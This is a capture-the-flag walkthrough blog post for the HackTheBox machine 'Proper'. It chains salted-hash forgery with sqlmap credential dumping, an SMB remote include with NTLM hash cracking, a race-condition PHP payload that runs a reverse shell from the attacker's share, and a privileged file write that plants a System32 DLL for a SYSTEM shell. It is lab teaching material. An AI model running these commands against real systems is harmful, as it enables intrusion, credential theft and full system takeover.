---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/L__Xr_S5Z38/0.jpg
layout: post
media_subpath: /assets/posts/2021-08-21-sqli-toc-tou-arbitrary-file-write-proper-hackthebox
tags:
- arbitrary file write
- hackthebox
- reversing
- sql injection
- race condition
title: SQLi, ToC/ToU & Arbitrary File Write - Proper @ HackTheBox
---

{% youtube L__Xr_S5Z38 %}

## User

We start our exploration by running a full portscan:

```
nmap -sV -sC proper.htb

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Only port 80 is reachable from the outside, so we continue to have a first look at the website. It seems to be a product page of a company selling various optimization products e.g. "Memdoubler Pro", "Cleaner Pro" and so on. Looking at the history in burp we can see that a suspicious looking request was made to the site:

```
GET /products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b HTTP/1.1
```

This order parameter looks like it could belong to a SQL Statement, e.g.: something like `select id, name from users order by id desc`. Here the developer seems to do the ordering in the backend by controlling the order parameter. The meaning of the hash value is however unclear at this point. Playing a bit with the request shows some interesting behaviour:

- Changing `desc` to `asc` leads to `Forbidden - Tampering attempt detected`
- Changing `id` to `name` leads also to `Forbidden - Tampering attempt detected`
- Changing the value of `h` to any other value leads to `Forbidden - Tampering attempt detected`
- Omitting `h` leads to an interesting disclosure which we can see below

```
<!-- [8] Undefined index: h

On line 6 in file C:\inetpub\wwwroot\products-ajax.php

  1 |   // SECURE_PARAM_SALT needs to be defined prior including functions.php 
  2 |   define('SECURE_PARAM_SALT','hie0shah6ooNoim'); 
  3 |   include('functions.php'); 
  4 |   include('db-config.php'); 
  5 |   if ( !$_GET['order'] || !$_GET['h'] ) {                <<<<< Error encountered in this line.
  6 |     // Set the response code to 500 
  7 |     http_response_code(500); 
  8 |     // and die(). Someone fiddled with the parameters. 
  9 |     die('Parameter missing or malformed.'); 
 10 |   } 
 11 |  
// -->
Parameter missing or malformed.
```

Here we can see that the `order` and `h` parameter are required. In addition we see a `SECURE_PARAM_SALT` of value `hie0shah6ooNoim`. This salt value is involved in producing a correct hash that the application would accept. A common way to use a salt value is to prepend it to the thing we are hashing, in this case some trial and error leads to:

```
printf 'hie0shah6ooNoimid desc' | md5sum
a1b30d31d344a5a4e41e8496ccbdd26b
```

The complete content of the order parameter `id+desc` is prepended by the salt and hashed with md5sum. With this knowledge we can now alter the order value without getting an error:

```
printf 'hie0shah6ooNoimid asc' | md5sum
181345bd7fce37aad011ea65a41b60c8  -

GET /products-ajax.php?order=id+asc&h=181345bd7fce37aad011ea65a41b60c8 
...
HTTP/1.1 200 OK
```

As we suspect a SQL Injection we try to inject a double quote:

```
GET /products-ajax.php?order=id+asc"&h=3b021c612d3c8c11782f725bb71f3e4a 
...
HTTP/1.1 500 Internal Server Error
```

This gives a code 500 response so we are on the right track. SQLMap can be used to exploit the injection, using eval to forge the hash:

```
sqlmap -u 'http://proper.htb/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="import hashlib;h=hashlib.md5('hie0shah6ooNoim'.encode('ascii')+order.encode('ascii')).hexdigest()" --threads 10 --dbs
...
available databases [3]:
[*] cleaner
[*] information_schema
[*] test

sqlmap -u 'http://proper.htb/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="import hashlib;h=hashlib.md5('hie0shah6ooNoim'.encode('ascii')+order.encode('ascii')).hexdigest()" --threads 10 -D cleaner --tables
...
Database: cleaner
[3 tables]
+-----------+
| customers |
| licenses  |
| products  |
+-----------+

sqlmap -u 'http://proper.htb/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="import hashlib;h=hashlib.md5('hie0shah6ooNoim'.encode('ascii')+order.encode('ascii')).hexdigest()" --threads 10 -D cleaner -T customers --dump
...
+----+------------------------------+----------------------------------------------+----------------------+
| id | login                        | password                                     | customer_name        |
+----+------------------------------+----------------------------------------------+----------------------+
| 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) | Vikki Solomon        |
| 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 (password2) | Neave Stone          |
| 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e (123456)    | Bertie McEachern     |
| 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b (12345)     | Jordana Kleiser      |
...
```

All of the hashes crack to simple passwords. Now we need to find a place to use them:

```
ffuf -w /home/xct/tools/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://proper.htb/FUZZ
...
licenses                [Status: 301, Size: 150, Words: 9, Lines: 2]
```

If we visit `/licenses` we get a login prompt and can use any of the email/password combinations to login. This presents us with a new page, showing active licenses for the user. When we look at the page we notice that we can switch between several themes "Darkly", "Flatly" and "Solar" – doing so sends a request like this:

```
GET /licenses/licenses.php?theme=flatly&h=a48e169864f4b46a09d36664ec645f75 
```

We know that hash scheme already, so we can manipulate the theme variable:

```
'hie0shah6ooNoimhello"' | md5sum
ba9ac4b071328a96c3026d0ce5dcdaeb  -

GET /licenses/licenses.php?theme=hello&h=d8b36c7ef1f12b1616b8538fc39e7081 
HTTP/1.1 200 OK
```

This results in another error:

```
<!-- [2] include(): Failed opening 'hello/header.inc' for inclusion (include_path='.;C:\php\pear')

On line 36 in file C:\inetpub\wwwroot\functions.php

 31 | // Following function securely includes a file. Whenever we 
 32 | // will encounter a PHP tag we will just bail out here. 
 33 | function secure_include($file) { 
 34 |   if (strpos(file_get_contents($file),'<?') === false) { 
 35 |     include($file);                <<<<< Error encountered in this line.
 36 |   } else { 
 37 |     http_response_code(403); 
 38 |     die('Forbidden - Tampering attempt detected.'); 
 39 |   } 
 40 | } 
 41 |  
// -->
```

The error reveals that the value we pass in via the theme parameter is directly included, but there is a check in front which makes sure that the file being included does not start with `<?`. The developer must have added this check to avoid a LFI vulnerability. As this is highly suspicious we try to include a file via RFI from our machine:

```
printf 'hie0shah6ooNoimhttp://192.168.216.129' | md5sum
99e437ad9a66db64de1b928f44b599b6
GET /licenses/licenses.php?theme=http://192.168.216.129&h=99e437ad9a66db64de1b928f44b599b6
...
```

We start a python webserver and can see that the request indeed hits it:

```
python3 -m http.server 80
...
192.168.216.130 - - [28/Jan/2021 19:01:27] "GET /header.inc HTTP/1.0" 200 -
```

This request is expecting a "header.inc" file to include. In the http response we can see however, that another error is generated:

```
<!-- [2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0
...
```

The http wrapper is disabled – so we will not get a RFI via HTTP here. As this is a windows target, we can however try smb. We start an impacket smb server and try it:

```
smbserver.py -smb2support user user
printf 'hie0shah6ooNoim\\\\192.168.216.129\\private' | md5sum
912f0d9ccd545f99aa714b7688316669  -
GET /licenses/licenses.php?theme=\\192.168.216.129\private&h=912f0d9ccd545f99aa714b7688316669
```

This gives us a hit and a hash:

```
[*] User PROPER\web authenticated successfully
[*] web::PROPER:aaaaaaaaaaaaaaaa:19c9773a5d5d8781dd019f4578396102:010100000000000080a9ad82a0f5d6011b806a8e3ac1d7ce00000000010010005900440055004700640072007100480003001000590044005500470064007200710048000200100050004b00610061006a004e00590063000400100050004b00610061006a004e00590063000700080080a9ad82a0f5d60106000400020000000800300030000000000000000000000000200000b3cc3caa1c8dc47ea48a763580dab67bfb4fa9779383f3bd055917aa2879b1830a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003200310036002e003100320039000000000000000000
```

Since null sessions are no longer allowed on windows by default, we can not include the file here. Cracking the hash is however possible:

```
john -w=rockyou.txt hash.txt
...
charlotte123!    (web)
```

We now know the password of the user reaching out to us: `charlotte123!`. This allows us to create an authenticated share:

```
smbserver.py -smb2support private private -user web -password 'charlotte123!'
```

We place a `header.inc` file just containing the string "hello" inside a `private` subfolder and request it. This indeed requests the file from our share and the server prints hello.

Now the only problem left is the tag filtering for php. We notice that check is done with `file_get_contents` which opens, and then closes the file. The `include` function will open it again, leaving the possibility for using a race condition to swap the file after the check.

We create a "header.inc.big" file with `dd bs=1M count=10 > header.inc.big < /dev/zero` and a payload file "pwn.inc":

```
<?php echo "Hello World";system("\\\\192.168.216.129\\private\\xc_192.168.216.129_1337.exe"); ?>
```

This payload will execute an xc (https://github.com/xct/xc) payload from our samba share to give us a reverse shell. Now we make sure "header.inc" that is requested first, is the big file, and then swapped after the first request by the payload:

```
cp header.inc.big header.inc ; inotifywait header.inc; sleep 2 ; cp pwn.inc header.inc
...
GET /licenses/licenses.php?theme=\\192.168.216.129\private&h=912f0d9ccd545f99aa714b7688316669
```

This results in a shell as web and allows it read the user flag:

```
[xc: C:\inetpub\wwwroot\licenses]: whoami
proper\web
[xc: C:\inetpub\wwwroot\licenses]: type C:\users\web\desktop\user.txt
01953ac7e2cdac01f8aab1911f7cc5ab
```

## Root

We start by running PrivescCheck by itm4n, which reveals a custom service:

```
Name        : cleanup
DisplayName : Cleanup
ImagePath   : "C:\Program Files\nssm.exe"
User        : LocalSystem
StartMode   : Automatic
```

We can see a custom service called "cleanup" and in "C:\\Programdata" we can see a folder "Cleanup" but its empty. Another Cleanup folder can be found in "C:\\Program Files" and contains 2 binaries and a readme:

```
11/15/2020  04:03 AM         2,999,808 client.exe
11/15/2020  09:22 AM               174 README.md
11/15/2020  05:20 AM         3,041,792 server.exe
```

README.md:

```
# Cleanup

We find the garbage on your system and delete it!

## Changelog

- 31.10.2020 - Alpha Release

## Todo

- Create an awesome GUI
- Check additional path
```

We learn from this, that the application is finding somehow "garbage" files and deleting them, which is what several AV vendors have as a feature as well. It is safe to assume that server.exe is the service we have been seeing earlier. We run "client.exe" and get the following output:

```
Cleaning C:\Users\web\Downloads
```

It seems to look for garbage files inside the users downloads folder, so we try to place a file and run it again:

```
[xc: C:\Program Files\Cleanup]: echo "1234" > \Users\web\Downloads\test.txt
[xc: C:\Program Files\Cleanup]: client.exe
Cleaning C:\Users\web\Downloads
xc: C:\Program Files\Cleanup]: dir \Users\web\Downloads
01/28/2021  10:45 AM                12 test.txt
```

But this does not seem to have changed anything as the file is still there. To get some more insight into what both binaries actually do, we copy them to our attacker machine and analyze them in ghidra. Note that you will need the plugin "https://github.com/felberj/gotools" or something similar, as this is a go application and is a real mess to analyze without a golang plugin (same goes for using IDA).

From Reversing the client binary we learn a few key points. There is a "clean" and a "restore" method. The restore method seems to be triggered by providing "-R" followed by a file path:

```
if (*(short *)DAT_005fd210[2] == 0x522d) { // -R
  local_58 = 7;
  local_38 = &DAT_0051d7b0;
}
```

In the clean method we can see that there is condition on when a file gets cleaned:

```
os.Stat();
(*local_8)();
if (0x278d00 < (local_e0 + -0xe7791f700) - (longlong)&stack0xfffffff1886e08d8) {
  main.serviceClean();
}
```

The result of os.Stat() is compared to 0x278d00 (2592000 = 30 days). So only files older than 30 days will be cleaned/deleted.

Looking at server shows us a decrypt and a encrypt method. Reversing this a bit further shows that the encrypt method is AES encrypting the file on "clean"  
and putting a copy into C:\\Programdata\\Cleanup so it can be restored later. This copy of the file has a base64 encoded file name. It is also possible to find the static AES key "180de01cd3e8acea6a16613a965ba259284" that is used, but it will not be required to solve this box. In addition we can see that several named pipe methods are used, so the service and the client binary communicate via named pipes.

Finally, we can proceed. We modify the timestamp of our test file, as we have learned it must be older than 30 days:

```
$(Get-Item C:\Users\web\Downloads\test.txt).creationtime=$(Get-Date "01/01/1990 06:00 am")
$(Get-Item C:\Users\web\Downloads\test.txt).lastaccesstime=$(Get-Date "01/01/1990 06:00 am")
$(Get-Item C:\Users\web\Downloads\test.txt).lastwritetime=$(Get-Date "01/01/1990 06:00 am")
```

Now the file is gone. If we look into "C:\\Programdata\\Cleanup" we can see the encoded and ecrypted copy was created:

```
dir  \programdata\cleanup
    Directory: C:\programdata\cleanup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/28/2021  11:23 AM            104 QzpcVXNlcnNcd2ViXERvd25sb2Fkc1x0ZXN0LnR4dA== (C:\Users\web\Downloads\test.txt)
```

We can restore the file as follows:

```
.\client.exe -R C:\Users\web\Downloads\test.txt
Restoring C:\Users\web\Downloads\test.txt
```

Now we should be suspicious. The service (server.exe) is restoring and deleting this file and we saw that it runs with SYSTEM privileges. This leads to the following plan:

We can "clean" a payload of our choosing and then rename it inside "\\programdata\\cleanup". This renaming will change the path where it will be restored, leading to a privileged file write. One way to abuse such a privileged file write is via UsoDllLoader (https://github.com/itm4n/UsoDllLoader) which requires a privileged write to C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll, in order to load it via the DiagTrack service.

After downloading & compiling the project we upload the malicious WindowsCoreDeviceInfo.dll into C:\\users\\web\\downloads\\ (Note that we will use the default payload with a changed port to 11337 here, any payload is fine though). We then change the timestamp and "clean" it:

```
iwr http://192.168.216.129/WindowsCoreDeviceInfo.dll -usebasicparsing -outfile C:\users\web\Downloads\WindowsCoreDeviceInfo.dll

$(Get-Item C:\Users\web\Downloads\WindowsCoreDeviceInfo.dll).creationtime=$(Get-Date "01/01/1990 06:00 am")
$(Get-Item C:\Users\web\Downloads\WindowsCoreDeviceInfo.dll).lastaccesstime=$(Get-Date "01/01/1990 06:00 am")
$(Get-Item C:\Users\web\Downloads\WindowsCoreDeviceInfo.dll).lastwritetime=$(Get-Date "01/01/1990 06:00 am")

"C:\program files\cleanup\client.exe"

dir \programdata\cleanup
-a----        1/28/2021  11:34 AM         370744 QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xXaW5kb3dzQ29yZURldmljZUluZm8uZGxs 
```

We now copy the file into a new base64 encoded filename for its destination "C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll":

```
copy \programdata\cleanup\QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xXaW5kb3dzQ29yZURldmljZUluZm8uZGxs \programdata\cleanup\QzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzQ29yZURldmljZUluZm8uZGxs
```

Finally we restore the file:

```
C:\Progra~1\Cleanup\client.exe -R C:\Windows\System32\WindowsCoreDeviceInfo.dll
Restoring C:\Windows\System32\WindowsCoreDeviceInfo.dll
```

And the file was indeed created:

```
dir \Windows\System32\WindowsCoreDeviceInfo.dll
-a----        1/28/2021  11:37 AM          92672 WindowsCoreDeviceInfo.dll 
```

We now trigger the exploit and use nc to connect to the spawned bind shell:

```
 usoclient StartInteractiveScan
 \programdata\nc.exe 127.0.0.1 11337
 C:\Windows\system32>
 whoami
 nt authority\system
 type C:\users\administrator\desktop\root.txt
 d145f40d084e82566dd9007d6add4a00
```

Thanks @jkr for creating this box with me :)

## Bonus

In case UsoDllLoader does not work (because of pending updates), you can use [WerTrigger](https://github.com/sailay1996/WerTrigger). It follows the exact same steps:

```
iwr http://<ip>/WerTrigger/WerTrigger.exe -outfile WerTrigger.exe -usebasicparsing
iwr http://<ip>/WerTrigger/Report.wer -outfile Report.wer -usebasicparsing
iwr http://<ip>/WerTrigger/phoneinfo.dll -outfile phoneinfo.dll -usebasicparsing

copy phoneinfo.dll c:\users\web\downloads\
$(Get-Item C:\Users\web\Downloads\phoneinfo.dll).creationtime=$(Get-Date "01/01/1990 06:00 am")
$(Get-Item C:\Users\web\Downloads\phoneinfo.dll).lastaccesstime=$(Get-Date "01/01/1990 06:00 am")
$(Get-Item C:\Users\web\Downloads\phoneinfo.dll).lastwritetime=$(Get-Date "01/01/1990 06:00 am")

C:\Progra~1\Cleanup\client.exe
copy \programdata\cleanup\QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xwaG9uZWluZm8uZGxs \programdata\cleanup\QzpcV2luZG93c1xTeXN0ZW0zMlxwaG9uZWluZm8uZGxs

C:\Progra~1\Cleanup\client.exe -R C:\Windows\System32\phoneinfo.dll
.\WerTrigger.exe
whoami && type c:\users\administrator\desktop\root.txt
```

The shell you get is pretty unstable so feel free to replace the payload inside phoneinfo.dll.